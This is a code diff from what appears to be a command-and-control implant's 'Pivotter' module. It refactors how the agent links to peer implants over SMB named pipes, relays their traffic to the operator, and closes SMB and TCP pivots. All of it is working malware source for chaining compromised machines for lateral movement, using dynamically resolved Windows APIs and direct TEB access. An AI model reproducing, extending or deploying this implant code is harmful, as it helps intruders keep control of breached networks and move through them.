@@ -24,43 +24,34 @@ void Pivotter::LinkPivotSMB(ULONG taskId, ULONG commandId, CHAR* pipename, Packe
 
 	DWORD dwMode = PIPE_READMODE_MESSAGE;
 	if (ApiWin->SetNamedPipeHandleState(hPipe, &dwMode, NULL, NULL)) {
-		BYTE* buffer = NULL;
-		DWORD bufferSize = 0;
-		DWORD readedBytes = 0;
-
+		
 		if (PeekNamedPipeTime(hPipe, 5000)) {
-			readedBytes = ReadFromPipe(hPipe, (BYTE*)&bufferSize, 4);
-			if (readedBytes == 4) {
-				buffer = (BYTE*)MemAllocLocal(bufferSize);
-				readedBytes = ReadFromPipe(hPipe, buffer, bufferSize);
+			LPVOID buffer      = NULL;
+			ULONG  bufferSize  = 0;
+			DWORD  readedBytes = ReadDataFromPipe(hPipe, &buffer, &bufferSize);
+
+			if (readedBytes > 4 && buffer) {
+				PivotData pivotData = { 0 };
+				pivotData.Id = taskId;
+				pivotData.Channel = hPipe;
+				pivotData.Type = PIVOT_TYPE_SMB;
+
+				this->pivots.push_back(pivotData);
+
+				outPacker->Pack32(taskId);
+				outPacker->Pack32(commandId);
+				outPacker->Pack8(pivotData.Type);
+				outPacker->Pack32(*((ULONG*)buffer));
+				outPacker->PackBytes((PBYTE)buffer + 4, readedBytes - 4);
+
+				MemFreeLocal(&buffer, bufferSize);
+
+				return;
 			}
 			else {
-				readedBytes = 0;
+				if (buffer && bufferSize)
+					MemFreeLocal(&buffer, bufferSize);
 			}
-		}
-
-		if (readedBytes > 4 && buffer) {
-
-			PivotData pivotData = { 0 };
-			pivotData.Id     = taskId;
-			pivotData.Channel = hPipe;
-			pivotData.Type = PIVOT_TYPE_SMB;
-
-			this->pivots.push_back(pivotData);
-
-			outPacker->Pack32(taskId);
-			outPacker->Pack32(commandId);
-			outPacker->Pack8(pivotData.Type);
-			outPacker->Pack32(*((ULONG*)buffer));
-			outPacker->PackBytes(buffer+4, readedBytes-4);
-
-			MemFreeLocal((LPVOID*)&buffer, bufferSize);
-
-			return;
-		}
-		else {
-			if(buffer && bufferSize)
-				MemFreeLocal((LPVOID*)&buffer, bufferSize);
 		}
 	}
 
@@ -79,9 +70,15 @@ void Pivotter::UnlinkPivot(ULONG taskId, ULONG commandId, ULONG pivotId, Packer*
 	for (int i = 0; i < this->pivots.size(); i++) {
 		pivotData = &(this->pivots[i]);
 		if (pivotData->Id == pivotId) {
-			if (pivotData->Channel) {
-				ApiWin->DisconnectNamedPipe(pivotData->Channel);
-				ApiNt->NtClose(pivotData->Channel);
+			if (pivotData->Type == PIVOT_TYPE_SMB) {
+				if (pivotData->Channel) {
+					ApiWin->DisconnectNamedPipe(pivotData->Channel);
+					ApiNt->NtClose(pivotData->Channel);
+				}
+			}
+			else if (pivotData->Type == PIVOT_TYPE_TCP) {
+				ApiWin->shutdown(pivotData->Socket, 2);
+				ApiWin->closesocket(pivotData->Socket);
 			}
 			result = pivotData->Type;
 			this->pivots.remove(i);
@@ -105,8 +102,10 @@ void Pivotter::WritePivot(ULONG pivotId, BYTE* data, ULONG size)
 	for (int i = 0; i < this->pivots.size(); i++) {
 		pivotData = &(this->pivots[i]);
 		if (pivotData->Id == pivotId) {
-			if (pivotData->Channel)
-				WriteDataToPipe(pivotData->Channel, data, size);
+			if (pivotData->Type == PIVOT_TYPE_SMB) {
+				if (pivotData->Channel)
+					WriteDataToPipe(pivotData->Channel, data, size);
+			}
 			break;
 		}
 	}
@@ -121,32 +120,37 @@ void Pivotter::ProcessPivots(Packer* packer)
 	PivotData* pivotData = NULL;
 	for (int i = 0; i < this->pivots.size(); i++) {
 		pivotData = &this->pivots[i];
-		if (pivotData->Channel) {
-			if (PeekNamedPipeTime(pivotData->Channel, 0)) {
-				BYTE* mallocBuffer = (BYTE*) MemAllocLocal(0x100000);
-				DWORD  readedBytes = ReadDataFromPipe(pivotData->Channel, mallocBuffer, 0x100000);
-				if (readedBytes != -1) {
-					packer->Pack32(0);
-					packer->Pack32(COMMAND_PIVOT_EXEC);
-					packer->Pack32(pivotData->Id);
-					packer->PackBytes(mallocBuffer, readedBytes);
+
+		if (pivotData->Type == PIVOT_TYPE_SMB) {
+			if (pivotData->Channel) {
+				if (PeekNamedPipeTime(pivotData->Channel, 0)) {
+					LPVOID mallocBuffer = NULL;
+					ULONG  mallocSize   = 0;
+					DWORD  readedBytes  = ReadDataFromPipe(pivotData->Channel, &mallocBuffer, &mallocSize);
+					if (readedBytes != -1) {
+						packer->Pack32(0);
+						packer->Pack32(COMMAND_PIVOT_EXEC);
+						packer->Pack32(pivotData->Id);
+						packer->PackBytes((PBYTE)mallocBuffer, readedBytes);
+					}
+					if(mallocBuffer && mallocSize)
+						MemFreeLocal(&mallocBuffer, readedBytes);
 				}
-				MemFreeLocal((LPVOID*)&mallocBuffer, readedBytes);
-			}
-			else {
-				if (TEB->LastErrorValue == ERROR_BROKEN_PIPE) {
-					TEB->LastErrorValue = 0;
+				else {
+					if (TEB->LastErrorValue == ERROR_BROKEN_PIPE) {
+						TEB->LastErrorValue = 0;
 
-					ApiWin->DisconnectNamedPipe(pivotData->Channel);
-					ApiNt->NtClose(pivotData->Channel);
+						ApiWin->DisconnectNamedPipe(pivotData->Channel);
+						ApiNt->NtClose(pivotData->Channel);
 
-					packer->Pack32(0);
-					packer->Pack32(COMMAND_UNLINK);
-					packer->Pack32(pivotData->Id);
-					packer->Pack8(PIVOT_TYPE_DISCONNECT);
+						packer->Pack32(0);
+						packer->Pack32(COMMAND_UNLINK);
+						packer->Pack32(pivotData->Id);
+						packer->Pack8(PIVOT_TYPE_DISCONNECT);
 
-					this->pivots.remove(i);
-					i--;
+						this->pivots.remove(i);
+						i--;
+					}
 				}
 			}
 		}
